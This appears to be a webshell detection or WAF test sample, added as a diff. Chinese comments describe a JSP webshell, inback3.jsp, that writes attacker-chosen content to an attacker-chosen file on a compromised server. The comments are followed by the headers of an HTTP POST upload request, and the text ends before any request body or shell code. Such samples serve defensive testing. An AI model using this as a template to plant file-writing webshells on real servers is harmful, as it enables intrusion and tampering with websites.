@@ -1,0 +1,15 @@
+# webshell-80000423
+# 这是一个简单的Webshell文件，具体来说，该WebShell检查是否存在名为 ""f"" 的参数，如果存在，它将获取名为 ""f"" 的参数值作为文件名，然后获取名为 ""t"" 的参数值作为要写入到文件的内容。它将使用 FileOutputStream 将内容写入文件。它的目的是允许攻击者在受感染的服务器上创建或覆盖文件，可能被滥用来写入恶意文件、更改网站内容或进行其他非法活动。
+# 基本信息：
+# - 文件名：inback3.jsp
+# - 文件大小：170B
+# 行为描述：
+# - 文件操作：上传文件、修改文件名、删除文件、修改文件内容、下载远程文件等。
+POST /?bid=hd_tag_m8mv25np HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25np
+RM-PRO-Token: 1c3a64bf0231c67ebfc9efb45aa3d185
+RM-PRO-Time: 1742808486400
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=CO2rxXlKDcvyxoOT_oAx1i53-cqP0OUb
+
